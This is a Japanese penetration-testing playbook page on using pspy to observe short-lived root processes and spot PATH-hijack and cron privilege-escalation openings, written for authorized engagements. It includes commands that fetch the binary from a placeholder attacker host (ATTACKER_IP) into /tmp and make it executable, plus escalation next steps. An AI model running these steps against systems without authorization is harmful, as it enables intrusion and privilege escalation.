# pspy — root プロセス観察ツール

## このファイルの位置づけ

`ps aux` で観察できないのは「ごく短時間しか起動しないプロセス」と「特定のイベント（SSH ログイン・タイマー発火）を引き金に瞬間起動するプロセス」。`pspy` は procfs を高頻度ポーリングしてこの種の短命プロセスを捕捉する**非特権**ツール。staff グループ + PATH ハイジャック・cron 経由の昇格・root が触れるパスの発見に直結する。

> **観点上の重要性：** 「root が SSH ログイン時に何を実行するか」「cron の度に何が起動するか」は手動の `ps aux` では絶対に見えない。pspy がない状態では「root のスクリプトが PATH 順序の前にあるディレクトリの実行ファイルを参照しているか」を確認できず、PATH ハイジャック手法の前提条件確認が成立しない。

---

## 着火条件

- 低権限シェルを取得した直後、`Enumeration_Checklist.md` の優先度「中」（実行中プロセス）に進む段階
- `id` で `staff` / `lxd` / `docker` などのグループに所属しており、PATH ハイジャック・cron スクリプト悪用が候補に上がっている
- `ps aux` を繰り返しても何も新しいものが見えないが、root が定期的・イベント連動で何かを実行している疑いがある

---

## 環境前提

- 実行環境: ターゲット側
- 必要なツール: `pspy`（ペネトレ用Linuxディストリ標準搭載ではない。GitHub のリリースから静的バイナリを取得して転送する）
- インターネットアクセス: 攻撃側端末から GitHub にアクセスできれば可。閉じたネットワークでは事前にバイナリを持参する
- 実行に root 権限不要（procfs 読み取りだけで完結する）

**バイナリのバリエーション（用途別の選び方）：**

| バイナリ | 用途 |
|---------|------|
| `pspy32` | 32-bit / コンパクト。古いシステムや組み込み環境向け |
| `pspy64` | 64-bit。現代の Linux ターゲット向け（既定で選ぶ） |
| `pspy32s` / `pspy64s` | 静的リンク版。ターゲット側に glibc が古いまたは特殊な場合の保険 |

## 観点・着眼点

**先に確認すること：**

- 自分のグループ（`id`）に `staff` が含まれている → PATH ハイジャック狙い：root プロセスの **PATH 環境変数** と **フルパスなしで呼ばれるコマンド** に注目
- `crontab -l` が空でも `/etc/cron*` で root 定期実行があるか確認 → pspy で実際の発火タイミング・実行コマンドを観察
- `find / -writable -type d 2>/dev/null` で書き込み可能ディレクトリが PATH に含まれていないか → pspy 出力と突き合わせる

**何が出たら次に何をするか（pspy 出力のパターン別シグナル）：**

| pspy 出力に観測される内容 | 示唆 | 次のアクション |
|------------------------|-----|-------------|
| `UID=0` のプロセスが `sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:...` で短命起動 | SSH ログイン引き金で root が外部コマンドを呼んでいる。PATH の先頭 2 つが書き込み可能なら PATH ハイジャック成立 | `ls -ld /usr/local/sbin /usr/local/bin` で書き込み権限確認 → `PAM_Misconfig.md` |
| `UID=0` のプロセスが `run-parts --lsbsysinit /etc/update-motd.d` を呼んでいる | MOTD 動的生成が root で動いている。`run-parts` がフルパスなしの場合、PATH 先頭への注入で乗っ取れる | 同上 → `PAM_Misconfig.md` |
| `UID=0` のプロセスが分単位で繰り返し起動（`/bin/sh -c [スクリプトパス]` 等） | root の cron ジョブ。スクリプトが書き込み可能ならそのまま改竄、フルパスなしのコマンド呼び出しがあれば PATH ハイジャック | スクリプトのパーミッション・内容を `cat` / `ls -la` で確認 |
| `UID=0` で `python` / `bash` / `perl` 等が引数付きで定期起動 | スクリプト言語で書かれた root ジョブ。引数のスクリプトを読んで処理を理解する | スクリプトのソースを `cat` |
| `UID=0` の `tar` / `find` / `cp` / `chown` 等が `staff` 書き込み可能ディレクトリを引数に取る | 書き込み可能パスを root が触っている → ファイル名トリック・シンボリックリンク攻撃の可能性 | 環境次第（GTFOBins / wildcard injection） |
| 引き金イベント（SSH 再接続・特定時刻）の前後で UID=0 のプロセスが集中して湧く | そのイベントが PATH ハイジャックや cron 系手法の発火点 | 自分で同じ引き金を引く（再 SSH ログイン等） |

**攻撃者の思考トレース：** `ps aux` には「いまこの瞬間動いているプロセス」しか出ない。SSH ログイン時の MOTD 処理・cron の毎分タスク・systemd timer は数十〜数百ミリ秒で完結するため、pspy のような高頻度ポーリングでなければ存在を確認できない。**「何も動いていないように見える」 = 「観察手段が足りない」を疑う。**

## 攻撃側の準備（必要な場合）

```bash
# [Attacker] バイナリ取得（GitHub アクセス可能な環境）
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64

# [Attacker] HTTP サーバーで配信（ターゲットが攻撃側に到達できる場合）
python3 -m http.server 8000
```

**閉じたネットワーク（インターネット遮断 VLAN）の場合：**

事前にジャンプサーバー・USB等経由でバイナリを持ち込む。本番では事前合意で「攻撃用ツールバイナリの持ち込み許可」を確認する。

## 手順

### 転送と起動

```bash
# [Target] 攻撃側 HTTP サーバーから取得
wget http://[ATTACKER_IP]:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64

# scp で転送する場合（攻撃側で実行）
# [Attacker]
scp pspy64 [USER]@[TARGET_IP]:/tmp/

# [Target] 起動（バックグラウンド or 前景）
/tmp/pspy64                # 標準モード（CPU・大量出力）
/tmp/pspy64 -pf -i 1000    # プロセス + ファイルアクセス監視 + 1秒間隔
/tmp/pspy64 -p             # プロセス監視のみ（軽量）
```

**観察用に別ターミナルで引き金を引く：**

```bash
# [Attacker] pspy が動いている裏で別 SSH セッションを張る
ssh [USER]@[TARGET_IP]
# → pspy 側で SSH ログイン引き金の root プロセスが見える
```

### よく使うオプション

| オプション | 説明 |
|----------|------|
| `-p` | プロセスイベントのみ監視（軽量） |
| `-f` | ファイルシステムイベントの監視を有効化 |
| `-i [ms]` | プロセススキャン間隔（既定 100ms。負荷を下げたい場合は 1000） |
| `-pf` | プロセス + ファイルの両方 |
| `-c` | カラー出力（端末で見やすい） |
| `-r [DIR]` | 監視対象ディレクトリの限定（既定は全 procfs） |

### 出力フォーマットの読み方

```
2024/01/01 12:34:56 CMD: UID=0    PID=1234 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
```

- `UID=0` → root が実行している
- `PID=1234` → プロセスID（短命なので `ps -p 1234` で追跡しても消えていることが多い）
- 後段がコマンドライン全文。**PATH 環境変数とフルパスなしのコマンドがここに見える**

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 代替手段 |
|--------------|---------|---------|
| pspy を数分動かしても UID=0 のプロセスが何も湧かない | 引き金が特定イベントに依存している | SSH 再ログイン・別ユーザーログイン・特定時刻待ち（cron は分単位）で再観察 |
| 出力が大量で読めない | 既定の 100ms 間隔は情報量が多い | `-i 1000` で 1 秒間隔に下げる、または `grep "UID=0"` で root プロセスのみ抽出 |
| 「Permission denied」エラーで起動しない | `/tmp` が `noexec` でマウントされている | `/dev/shm` / `/var/tmp` に移して実行、または `mount` で `noexec` 確認 |
| バイナリが転送できない（HTTP 接続不可） | 攻撃側ネットワークが届いていない | `Kernel_Exploits.md` のファイル転送パターン（base64 経由・SSH 直転送）を参照 |
| `-pf` が ENOMEM で落ちる | inotify watch 上限到達 | `-p` のみに切り替え、または `sysctl fs.inotify.max_user_watches` を確認 |

---

## 注意点・落とし穴

- **CPU 負荷が高い。** 既定の 100ms 間隔は本番環境では検知される可能性がある。本番では `-i 1000` 程度に下げる
- **配置パスを覚えておき、原状回復で削除する。** `/tmp/pspy64` を残すと痕跡になる
- **pspy 起動中に別 SSH セッションを張ることが大事。** SSH ログイン引き金の手法（PAM / MOTD 経由）はこの観察の流れでないと前提条件確認が成立しない
- **静的リンク版（`pspy64s`）が必要なケース：** ターゲットの glibc バージョンが古い・存在しない（distroless / minimal コンテナ）場合は動的リンク版が動かない

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）。pspy 自体は読み取りのみで非破壊だが、ペネトレ用ツールバイナリの持ち込みは許可確認が必要
- **想定される SIEM/EDR 検知**: ファイル転送（HTTP / SCP）が IDS で検知される可能性。バイナリのハッシュが既知ペネトレツールとして AV/EDR にフラグされる可能性
- **業務影響リスク**: なし（読み取りのみ）。ただし `-i 100` の高頻度ポーリングは CPU 負荷上昇を伴う
- **原状回復必須項目**: ✅ 配置したバイナリ（`/tmp/pspy*`）の削除 / ✅ 攻撃側 HTTP サーバーの停止
- **取得情報の取扱**: pspy 出力には他ユーザー・サービスのコマンドラインが含まれうる（環境変数経由のシークレット等）→ 案件終了時破棄
- **演習環境での扱い**: 制約なし
